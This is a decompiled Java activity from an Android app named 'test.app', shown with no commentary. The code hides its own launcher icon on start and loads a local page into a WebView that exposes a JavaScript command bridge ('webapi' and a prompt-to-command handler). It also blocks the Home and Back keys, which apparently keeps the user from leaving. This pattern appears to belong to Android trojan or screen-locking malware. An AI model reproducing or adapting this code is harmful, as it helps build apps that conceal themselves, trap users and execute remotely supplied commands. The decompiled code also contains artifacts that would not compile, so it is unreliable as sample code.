package test.app;

import android.app.Activity;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.view.KeyEvent;
import android.webkit.JsPromptResult;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class MainActivity
  extends Activity
{
  public static int IDD_LOADING = 100;
  public static WebApi api;
  static ProgressDialog loadingDialog = null;
  public static WebView webView;
  
  public MainActivity() {}
  
  public static void callJsCallbackAndroidVersion(String paramString)
  {
    try
    {
      paramString = "'" + paramString + "'";
      paramString = "javascript:androidVersion(" + paramString + ")";
      webView.loadUrl(paramString);
      return;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public void dismissDialog()
  {
    try
    {
      if (loadingDialog != null)
      {
        loadingDialog.dismiss();
        loadingDialog = null;
      }
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public void onConfigurationChanged(Configuration paramConfiguration)
  {
    super.onConfigurationChanged(paramConfiguration);
    setRequestedOrientation(1);
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);
    showDialog(IDD_LOADING);
    MainReceiver.init(this);
    api = new WebApi(this);
    webView = new WebView(this);
    paramBundle = new WebViewClient()
    {
      public void onPageFinished(WebView paramAnonymousWebView, String paramAnonymousString)
      {
        if (Constants.DEBUG) {
          Settings.debug("page loaded");
        }
        try
        {
          MainActivity.this.removeDialog(MainActivity.IDD_LOADING);
          MainActivity.callJsCallbackAndroidVersion(Build.VERSION.RELEASE);
          return;
        }
        catch (Exception paramAnonymousWebView)
        {
          for (;;)
          {
            paramAnonymousWebView.printStackTrace();
          }
        }
      }
    };
    webView.setWebViewClient(paramBundle);
    webView.setScrollBarStyle(33554432);
    webView.getSettings().setJavaScriptEnabled(true);
    webView.setWebChromeClient(new WebChromeClient()
    {
      public boolean onJsPrompt(WebView paramAnonymousWebView, String paramAnonymousString1, String paramAnonymousString2, String paramAnonymousString3, JsPromptResult paramAnonymousJsPromptResult)
      {
        paramAnonymousWebView = MainActivity.api.textToCommand(paramAnonymousString2, paramAnonymousString3);
        if (paramAnonymousWebView.find)
        {
          paramAnonymousJsPromptResult.confirm(paramAnonymousWebView.result);
          return true;
        }
        return false;
      }
    });
    webView.addJavascriptInterface(api, "webapi");
    setContentView(webView);
    webView.loadUrl("file:///android_asset/html/index.html");
  }
  
  protected Dialog onCreateDialog(int paramInt)
  {
    if (Constants.DEBUG) {
      Settings.debug("onCreateDialog: " + paramInt);
    }
    if (paramInt == IDD_LOADING)
    {
      loadingDialog = new ProgressDialog(this);
      loadingDialog.setProgressStyle(0);
      loadingDialog.setTitle("");
      loadingDialog.setMessage("Loading");
      loadingDialog.setCancelable(false);
      return loadingDialog;
    }
    return null;
  }
  
  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent)
  {
    if (paramInt == 3) {}
    while (paramInt == 4) {
      return true;
    }
    return false;
  }
}
